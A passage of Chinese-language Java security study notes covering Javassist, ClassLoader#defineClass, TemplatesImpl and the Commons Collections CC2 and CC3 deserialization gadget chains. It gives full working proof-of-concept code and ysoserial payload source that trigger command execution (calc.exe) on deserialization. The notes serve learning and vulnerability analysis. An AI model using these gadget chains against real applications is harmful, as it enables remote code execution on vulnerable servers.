- Classpool :  一个基于HashMap实现的CtClass对象，其中键是类名称，值是表示该类的CtClass对象。默认的ClassPool使用与底层JVM相同的类路径，因此在某些情况下，可能需要向ClassPool添加类路径或类字节。
- CtClass :  表示一个类，可以从ClassPool获得
- CtMethods :   表示类的方法
- CtFields :  表示类的字段

#### ClassPool

常用方法

- ClassPool getDefault()  :  返回默认的类池
- ClassPath insertClassPath(String pathname)  :  在搜索路径的开头插入目录或 jar 或zip文件
- ClassPath insertClassPath(ClassPath cp)  :   ClassPath在搜索路径的开头插入一个对象
- java.lang.ClassLoader getClassLoader()  :  读取类加载器
- CtClass get(java.lang.String classname)	从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用。
- ClassPath	appendClassPath(ClassPath cp)	 将ClassPath对象附加到搜索路径的末尾。
- CtClass	makeClass(java.lang.String classname)  创建一个新的public类

#### CtClass

- void setSuperclass(CtClass clazz)	更改超类，除非此对象表示接口。
- java.lang.Class<?> toClass(java.lang.invoke.MethodHandles.Lookup lookup)	将此类转换为java.lang.Class对象。
- byte[] toBytecode()	将该类转换为类文件。
- void writeFile()		将由此CtClass 对象表示的类文件写入当前目录。
- void writeFile(java.lang.String directoryName)	 将由此CtClass 对象表示的类文件写入本地磁盘。
- CtConstructor	makeClassInitializer()	制作一个空的类初始化程序（静态构造函数）。

#### CtMethod

- void  insertBefore (java.lang.String src)	在方法开头插入字节码
- void	insertAfter	(java.lang.String src)	在方法的末尾插入字节码。
- void	setBody (CtMethod src, ClassMap map)  从另一个方法复制方法体

#### CtConstruct

- void	setBody(java.lang.String src)	设置构造函数主体。
- void	setBody(CtConstructor src, ClassMap map)	从另一个构造函数复制一个构造函数主体。
- CtMethod	toMethod(java.lang.String name, CtClass declaring)	复制此构造函数并将其转换为方法。

#### CtField

类中的字段。

#### 动态生成类

```
package javassist;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.bytecode.AccessFlag;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class MakeClassDemo {
    public static void main(String[] args) throws CannotCompileException, IOException, NotFoundException {
        // 1. 获取默认类池
        ClassPool pool = ClassPool.getDefault();
        // 2. 创建一个自定义类
        CtClass ctClass = pool.makeClass("Demo");
        // 3. 添加接口和继承类
        ctClass.setInterfaces(new CtClass[]{pool.makeInterface("java.io.Serializable")});
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        // 4. 添加属性
        // 新建一个 int 类型的 id 成员变量
        CtField id = new CtField(CtClass.intType, "id", ctClass);
        // 将 id 设置为 public
        id.setModifiers(AccessFlag.PUBLIC);
        // 将 id 属性 给 demo 类
        ctClass.addField(id);
        // 5. 添加静态代码块
        CtConstructor initializer = ctClass.makeClassInitializer();
        initializer.setBody("System.out.println(\"Hello,Javasist\");");
        //  添加构造方法
        CtConstructor ctConstructor = CtNewConstructor.make("public Demo(int id){this.id=id;}", ctClass);
        ctClass.addConstructor(ctConstructor);
        // 6. 添加方法
        CtMethod ctMethod = CtNewMethod.make("public void calcDemo(){java.lang.Runtime.getRuntime().exec(\"calc.exe\");}", ctClass);
        ctClass.addMethod(ctMethod);
        // 7. 写入磁盘
        // 转换字节流
        byte[] bytes = ctClass.toBytecode();
        // 写入磁盘
        System.out.println(System.getProperty("user.dir"));
        File file = new File(new File(System.getProperty("user.dir"), "src/main/java/javassist/"), "Demo.class");
        FileOutputStream fos = new FileOutputStream(file);
        fos.write(bytes);
        fos.close();


    }
}
```



![image-20220116105735690](img/image-20220116105735690.png)![image-20220116105735690](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116105735690.png?lastModify=1646033842)

#### 动态获取类方法

```
package javassist;

public class Demo1 {
    public void hello(){
        System.out.println("hello");
    }
}
package javassist;

public class JavassistDemo1 {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("javassist.Demo1");
        CtMethod ctMethod = ctClass.getDeclaredMethod("hello");
        ctMethod.insertBefore("java.lang.Runtime.getRuntime().exec(\"calc\");");
        Class<?> aClass = ctClass.toClass();
        Demo1 demo1 = (Demo1) aClass.newInstance();
        demo1.hello();
    }
}
```



![image-20220116110309157](img/image-20220116110309157.png)![image-20220116110309157](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116110309157.png?lastModify=1646033842)

#### javassist特殊参数

| 标识符                         | 作用                                        |
| ------------------------------ | ------------------------------------------- |
| 0、0、0、1、$2、 3 、 3、 3、… | this和方法参数（1-N是方法参数的顺序）       |
| $args                          | 方法参数数组，类型为Object[]                |
| $$                             | 所有方法参数，例如：m($$)相当于m(1,1,1,2,…) |
| $cflow(…)                      | control flow 变量                           |
| $r                             | 返回结果的类型，在强制转换表达式中使用。    |
| $w                             | 包装器类型，在强制转换表达式中使用。        |
| $_                             | 返回的结果值                                |
| $sig                           | 类型为java.lang.Class的参数类型对象数组     |
| $type                          | 类型为java.lang.Class的返回值类型           |
| $class                         | 类型为java.lang.Class的正在修改的类         |

## ClassLoader

ClassLoader是Java的类加载器，负责将字节码转化成内存中的Java类，加载过程中采用双亲委派来实现加载.

也和反射差不多，可以通过`ClassLoader.loadClass()` 获取Class对象。

```
package classloader;

public class Demo {
    static{
        System.out.println("Demo static");
    }
    public void hello(){
        System.out.println("Demo hello");
    }
}
package classloader;

import java.lang.reflect.Method;

public class ClassloaderDemo1 {
    public static void main(String[] args) throws Exception {
        Class<?> aClass = ClassLoader.getSystemClassLoader().loadClass("classloader.Demo");
        Demo demo = (Demo) aClass.newInstance();
        demo.hello();

        Method hello = aClass.getDeclaredMethod("hello");
        hello.invoke(demo);
    }
}
```

可以使用 `loadClass` 加载字节码。需要反射来调用

![image-20220116111651740](img/image-20220116111651740.png)![image-20220116111651740](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116111651740.png?lastModify=1646033842)

```
package classloader;

public class Demo {
    static{
        System.out.println("Demo static");
    }
    public void hello(){
        System.out.println("Demo hello");
    }
}
package classloader;

import sun.misc.IOUtils;

import java.io.File;
import java.io.FileInputStream;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.Base64;

public class ClassloaderDemo2 {
    public static void main(String[] args) throws Exception {
        // 获取class字节码
        FileInputStream fileInputStream = new FileInputStream(new File("src/main/java/classloader/Demo.class"));
        byte[] code = IOUtils.readFully(fileInputStream, -1, false);


        Class aClass = Class.forName("java.lang.ClassLoader");
        Method method = aClass.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        method.setAccessible(true);
        Class aClass1= (Class) method.invoke(ClassLoader.getSystemClassLoader(), "classloader.Demo", code, 0, code.length);
        Demo demo = (Demo) aClass1.newInstance();// 实例化会执行静态代码块
        demo.hello();

    }
}
```

输出：

```
Demo static
Demo hello
```

那么`ClassLoader#defineClass` 与 `javassist` 配合起来就可以动态执行任意代码了。

javassist生成字节码，defineClass获取字节码，解析类。

在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链 TemplatesImpl 的基石。

## TemplatesImpl

```
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 这个类中定义了一个内部类`TransletClassLoader
static final class TransletClassLoader extends ClassLoader {
    private final Map<String,Class> _loadedExternalExtensionFunctions;

    TransletClassLoader(ClassLoader parent) {
        super(parent);
        _loadedExternalExtensionFunctions = null;
    }

    TransletClassLoader(ClassLoader parent,Map<String, Class> mapEF) {
        super(parent);
        _loadedExternalExtensionFunctions = mapEF;
    }

    public Class<?> loadClass(String name) throws ClassNotFoundException {
        Class<?> ret = null;
        // The _loadedExternalExtensionFunctions will be empty when the
        // SecurityManager is not set and the FSP is turned off
        if (_loadedExternalExtensionFunctions != null) {
            ret = _loadedExternalExtensionFunctions.get(name);
        }
        if (ret == null) {
            ret = super.loadClass(name);
        }
        return ret;
    }

    /**
         * Access to final protected superclass member from outer class.
         */
    Class defineClass(final byte[] b) {
        return defineClass(null, b, 0, b.length);
    }
}
```

这里重写了`defineClass` ，并且没有显式对定义域声明，可以被同包内调用。

找其调用处

```
public  TemplatesImpl#getOutputProperties --->
public  TemplatesImpl#newTransformer  --->
TemplatesImpl#getTransletInstance --->
TemplatesImpl#defineTransletClasses --->
TransletClassLoader#defineClass
```

前两处调用修饰符为 public ，可以被外部调用。

```
package templatesimpl;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import java.lang.reflect.Field;

public class TemplatestImplDemo1 {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("Demo");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        CtConstructor ctConstructor = ctClass.makeClassInitializer();
        ctConstructor.setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        byte[] bytes = ctClass.toBytecode();

        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field _name = aClass.getDeclaredField("_name");
        _name.setAccessible(true);
        _name.set(templates,"Demo");

        Field _bytecodes = aClass.getDeclaredField("_bytecodes");
        _bytecodes.setAccessible(true);
        _bytecodes.set(templates,new byte[][]{bytes});

        Field _tfactory = aClass.getDeclaredField("_tfactory");
        _tfactory.setAccessible(true);
        _tfactory.set(templates,new TransformerFactoryImpl());

        templates.getOutputProperties();
    }
}
```

可以简化反射赋值代码

```
public static void setFieled(TemplatesImpl templates,Class clas ,String fieled,Object obj) throws Exception{
    Field _field = clas.getDeclaredField(fieled);
    _field.setAccessible(true);
    _field.set(templates,obj);
}
```

![image-20220116122059021](img/image-20220116122059021.png)![image-20220116122059021](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116122059021.png?lastModify=1646033842)

注意。 ***bytecodes 是由字节码组成的数组； _name 可以是任意字符串，只要不为null即可；\*tfactory 必须为TransformerFactoryImpl 对象，另外，TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类。**

## POC2

POC:

```
package cc2;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC2Demo2 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        // 获取默认类池
        ClassPool pool = ClassPool.getDefault();
        CtClass cc2 = pool.makeClass("CC2");
        cc2.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        cc2.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        byte[] code = cc2.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{code});
        setFieldValue(obj,"_name","test");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());

        InvokerTransformer transformer = new InvokerTransformer("toString", null, null);
        TransformingComparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(obj);
        queue.add(obj);

        setFieldValue(transformer,"iMethodName","newTransformer");

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
        outputStream.writeObject(queue);
        outputStream.close();

        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.out"));
        inputStream.readObject();

    }
}
```

链子

```
inputStream#readObject --->
PriorityQueue#readObject --->
PriorityQueue#heapify --->
PriorityQueue#siftDonw --->
PriorityQueue#siftDownUsingComparator --->
TransformingComparator#compare --->
InvokerTransformer#transform --->
TemplatesImpl#newTransformer
```

本质上还是要使用`InvokerTransformer` 的`transformer` 方法调用任意方法。

## poc1和poc2区别

poc2可以利用 javassist 技术执行任意代码，而poc1只能相互调用 transformer 执行命令。而执行代码能造成的危害会更加大。

## ysoserial CC2

调试一遍ysoserial cc2

```
package ysoserial.payloads;

import java.util.PriorityQueue;
import java.util.Queue;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({ "org.apache.commons:commons-collections4:4.0" })
@Authors({ Authors.FROHOFF })
public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {

	public Queue<Object> getObject(final String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);
		// mock method name until armed
		final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
		// stub data for replacement later
		queue.add(1);
		queue.add(1);

		// switch method called by comparator
		Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

		// switch contents of queue
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = 1;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections2.class, args);
	}

}
```

paylaod生成，打断点

![image-20220116124641815](img/image-20220116124641815.png)![image-20220116124641815](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116124641815.png?lastModify=1646033842)

跟进`Gadgets.createTemplatesImpl` ，这是 ysoserial自己写的类.方法

`System.getProperty` 获取系统变量的值为 false

![image-20220116125145302](img/image-20220116125145302.png)![image-20220116125145302](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116125145302.png?lastModify=1646033842)

跟进`createTemplatesImpl` 方法，先反射实例化了`TemplatesImpl`对象，然后利用到了`ClassPool`动态生成对象，`insertClassPath`方法增加搜索类的路径，这样搜索类的时候就不只局限于默认路径,然后`makeClassInitializer` 添加静态方法块，内容为传进来的参数，并通过

`setSuperclass` 设置`class com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet` 为父类，最后得到字节码

![image-20220116125753448](img/image-20220116125753448.png)![image-20220116125753448](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116125753448.png?lastModify=1646033842)

`Reflections.setFieldValue` 设置`TemplatesImpl`对象属性`_bytecodes`、`_name`、`_tfactory`的值，然后返回`TemplatesImpl`对象

![image-20220116125931641](img/image-20220116125931641.png)![image-20220116125931641](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116125931641.png?lastModify=1646033842)

回到`getObject`方法中，创建`InvokerTransformer` 对象，参数`toString` 是为了生成paylaod时不执行命令，后续会替换成真正的恶意参数，

![image-20220116130403349](img/image-20220116130403349.png)![image-20220116130403349](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116130403349.png?lastModify=1646033842)

接下来实例化`PriorityQueue` ,容量为2，比较器为`TransformingComparator` 对象，传入的参数为`InvokerTransformer`对象，add方法增加两个占位符，

传入的参数会在比较时用到，

![image-20220116135507523](img/image-20220116135507523.png)![image-20220116135507523](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116135507523.png?lastModify=1646033842)

然后将`transformer` 对象的参数换成真正的`newTransformer` ，便于后续执行`TemplatesImpl#newTransformer`

![image-20220116130444612](img/image-20220116130444612.png)![image-20220116130444612](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116130444612.png?lastModify=1646033842)

这里反射获取`PriorityQueue`队列的queue属性，并将`TemplatesImpl` 对象放入`queue`数组，

![image-20220116130739334](img/image-20220116130739334.png)![image-20220116130739334](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116130739334.png?lastModify=1646033842)

返回`PriorityQueue`对象，序列化，在反序列化。

到这开始反序列化数据

![image-20220116130910472](img/image-20220116130910472.png)![image-20220116130910472](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116130910472.png?lastModify=1646033842)

在`PriorityQueue#readObject` 处下断点，这里赋值，queue[0] 为生成paylaod时添加进去的`TemplatesImpl` 对象

![image-20220116131126852](img/image-20220116131126852.png)![image-20220116131126852](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116131126852.png?lastModify=1646033842)

跟进`heapify`  ---> `siftDown` 

判断比较器不为空

![image-20220116135935700](img/image-20220116135935700.png)![image-20220116135935700](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116135935700.png?lastModify=1646033842)

 跟进`siftDownUsingComparator` ，x参数为`TemplatesImpl`对象，

调用到 `comparator.compare` ，即`TransformingComparator.compare()`

![image-20220116140106018](img/image-20220116140106018.png)![image-20220116140106018](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116140106018.png?lastModify=1646033842)

跟进`this.transformer.transform` 参数为`TemplatesImpl` 对象，`this.transformer` 是 `InvokerTransformer` 对象

![image-20220116131302390](img/image-20220116131302390.png)![image-20220116131302390](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116131302390.png?lastModify=1646033842)

这里`input` 为`TemplatesImpl` 对象，`method` 为 `newTransformer` ，`this.iArgs` 不重要，因为这里调用的是`TemplatesImpl#newTransformer` ，

![image-20220116131521158](img/image-20220116131521158.png)![image-20220116131521158](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116131521158.png?lastModify=1646033842)

跟进`getTransletInstance`

![image-20220116140825603](img/image-20220116140825603.png)![image-20220116140825603](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116140825603.png?lastModify=1646033842)

判断`_name` 如果为空，返回 null.所以之前要给`_name`需要随便赋值。

如果`_class` 为空，调用`defineTransletClasses` 方法，

![image-20220116140940848](img/image-20220116140940848.png)![image-20220116140940848](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116140940848.png?lastModify=1646033842)

跟进`defineTransletClasses` ,

通过`ClassLoader#defineClass`获取`_bytecodes` 里存储的对象，然后判断字节码存储对象的父类是否为`ABSTRACT_TRANSLET` ,这就是`TemplatesImpl`加载的字节码需要继承`AbstractTranslet` 。

```
private static String ABSTRACT_TRANSLET
        = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
_transletIndex = 0
```

![image-20220116141323566](img/image-20220116141323566.png)![image-20220116141323566](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116141323566.png?lastModify=1646033842)

回到`getTransletInstance` ,实例化`_class[_transletIndex].getConstructor().newInstance()` ，此时`_transletIndex`值为0，所以就是字节码解析的恶意类，从而执行静态代码块，执行命令

![image-20220116142300225](img/image-20220116142300225.png)![image-20220116142300225](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116142300225.png?lastModify=1646033842)

```
public  TemplatesImpl#newTransformer  --->
TemplatesImpl#getTransletInstance --->
TemplatesImpl#defineTransletClasses --->
TransletClassLoader#defineClass
```

https://www.cnblogs.com/CoLo/p/15383642.html

https://xz.aliyun.com/t/10387#toc-1

Java安全漫谈 - 13.Java中动态加载字节码的那些方法.pdf

Java安全漫谈 - 16.commons-collections4与漏洞修复.pdf

https://www.yuque.com/tianxiadamutou/zcfd4v/fw3ag3

# CommonsCollections3

小于jdk8u71

Commons collections 3.1

CC3其实是CC1和CC2的结合，利用`TransformedMap` 和 `TemplatesImpl`。

回顾一下，CC1是利用`ChainedTransformer` 将多个 Transformer 串在一起。

那么我们只需要将串起的`Transformer` 变一下，最终变成CC2的`TemplatesImpl#newTransformer`就可以了。

## POC1

demo:

```
package cc3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC3Demo1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc3 = pool.makeClass("CC3");
        cc3.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        cc3.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        byte[] code = cc3.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{code});
        setFieldValue(obj,"_name","test");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());

        Transformer[] transformers = {
                new ConstantTransformer(obj),
                new InvokerTransformer("newTransformer", null, null)
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
        outerMap.put("xxx","xxx");
    }
}
```

![image-20220116165223303](img/image-20220116165223303.png)![image-20220116165223303](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116165223303.png?lastModify=1646033842)

## ysoserial CC3

但是在ysoserial CC3中并没有用到`InvokerTransformer` ，而实用到了新的 transformer `InstantiateTransformer` 。

这是为了规避一定的检测规则，比如设置黑名单中有检测`InvokerTransformer` ，那么这些链就都不可以用了，所以有了绕过的方式，也就是寻找其他的链来代替被检测的。

#### TrAXFilter

其构造函数调用了`newTransformer` ，并且`templates` 可控

![image-20220116174324283](img/image-20220116174324283.png)![image-20220116174324283](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116174324283.png?lastModify=1646033842)

#### InstantiateTransformer

重写的`transform` 方法，可以调用别人的构造函数，

```
((Class) input).getConstructor
```

那么可以把两个组合起来，

```
InstantiateTransformer#transform --->
TrAXFilter#construct --->
TemplatesImpl#newTransformer
```

![image-20220116174528173](img/image-20220116174528173.png)![image-20220116174528173](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220116174528173.png?lastModify=1646033842)

## POC2

JDK8U71 前

Commons Collections3.1	

pom.xml

```
<dependency>
    <groupId>javassist</groupId>
    <artifactId>javassist</artifactId>
    <version>3.12.0.GA</version>
</dependency>

<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.1</version>
</dependency>
package cc3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.xml.internal.messaging.saaj.util.ByteOutputStream;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC3Demo2 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc3 = pool.makeClass("CC3");
        cc3.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        cc3.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        byte[] code = cc3.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{code});
        setFieldValue(obj,"_name","test");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());

        Transformer[] transformers = {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[] { Templates.class },new Object[] { obj } )
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap innerMap = new HashMap();
        innerMap.put("value","xxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer);

        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj1 = constructor.newInstance(Target.class, outerMap);
        System.out.println(obj1);

        ByteOutputStream byteOutputStream = new ByteOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteOutputStream);
        objectOutputStream.writeObject(obj1);

        System.out.println(byteOutputStream);
        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteOutputStream.getBytes()));
        objectInputStream.readObject();
    }
}
```

调用链：

```
objectInputStream.readObject --->
AnnotationInvocationHandler#readObject --->
AbstractInputCheckedMapDecorator#setValue --->
TransformedMap#checkSetValue --->
ChainedTransformer#transform --->
得到 TrAXFilter对象，作为参数传入 InstantiateTransformer#transform --->
TrAXFilter#getConstructor#newInstance --->
TransformerImpl#newTransformer --->
TransformerImpl#getTransletInstance --->
TransformerImpl#defineTransletClasses --->
ClassLoader#defineClass --->
AbstractTranslet#newInstance --->
字节码对象实例化，执行静态代码块
```

## POC3

ysoserial中用的是 LazyMap

```
package cc3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.xml.internal.messaging.saaj.util.ByteOutputStream;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC3Demo3 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc3 = pool.makeClass("CC3");
        cc3.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        cc3.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        byte[] code = cc3.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{code});
        setFieldValue(obj,"_name","test");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());

        Transformer[] transformers = {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[] { Templates.class },new Object[] { obj } )
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap innerMap = new HashMap();
        innerMap.put("value","xxx");
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);

        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, outerMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, handler);

        handler  = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);

        ByteOutputStream byteOutputStream = new ByteOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteOutputStream);
        objectOutputStream.writeObject(handler);

        System.out.println(byteOutputStream);
        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteOutputStream.getBytes()));
        objectInputStream.readObject();
    }
}
```

Java安全漫谈 - 14.为什么需要CommonsCollections3.pdf

# CommonsCollection4

Commons-collections4 版本

java1.8版本也可

